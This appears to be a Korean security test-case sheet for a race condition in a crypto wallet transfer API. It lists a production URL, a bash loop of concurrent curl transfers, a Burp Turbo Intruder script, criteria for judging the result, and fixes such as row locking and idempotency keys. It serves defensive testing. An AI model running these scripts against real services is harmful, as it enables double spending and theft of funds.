================================================================================
[VCE-WALLET-03] 내부 이체 Race Condition → 이중 이체
도메인: wallet (지갑/이체)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 내부 이체 Race Condition
- **번호**: WALLET-03
- **위험도**: High
- **OWASP**: Business Logic / Concurrency

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/wallets/transfer |
| 운영 | https://vceapp.com/api/wallets/transfer |
| HTTP 메서드 | POST |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

이체 처리가 원자적이지 않으면:
```
잔고: 0.001 BTC
T1: 잔고 조회 → 0.001 BTC 확인
T2: 잔고 조회 → 0.001 BTC 확인 (T1 차감 전)
T1: 0.001 BTC 이체 성공
T2: 0.001 BTC 이체 성공 (이미 T1에서 이체했음에도)
결과: 0.001 BTC로 0.002 BTC 이체
```

## 4. 테스트 절차 (Step-by-step)

### Step 1. 잔고 확인

```
GET /api/assets/BTC HTTP/1.1
Authorization: Bearer <JWT>
```

잔고: 0.001 BTC

---

### Step 2. 동시 이체 요청 (0.001 BTC × 5개)

```bash
JWT="<your_jwt>"
TO_ADDRESS="대상지갑주소"

for i in $(seq 1 5); do
  curl -s -X POST http://localhost:8080/api/wallets/transfer \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d "{\"toAddress\":\"$TO_ADDRESS\",\"amount\":0.001,\"assetType\":\"BTC\"}" &
done
wait
```

---

### Step 3. Burp Turbo Intruder

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1)
    for i in range(10):
        engine.queue(target.req, None)
```

---

### Step 4. 결과 확인

```
GET /api/assets/BTC HTTP/1.1
Authorization: Bearer <JWT>
```

정상: 0.001 BTC 이체 1건 성공, 잔고 0
취약: 여러 건 이체 성공, 잔고 음수

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 동시 5개 이체 중 2개 이상 성공
- 최종 잔고 음수

✗ **안전 (Not Vulnerable)**:
- 1개만 성공, 나머지 "잔고 부족" 반환

## 6. 예상 취약 포인트 (코드 위치)

- `WalletService.java` — transfer 메서드 동시성 처리

## 7. 권고 조치

- 비관적 락: `SELECT ... FOR UPDATE`
- 원자적 잔고 차감: `UPDATE wallets SET balance = balance - ? WHERE balance >= ?`
- 이체 멱등성 키 적용 (동일 요청 중복 처리 방지)
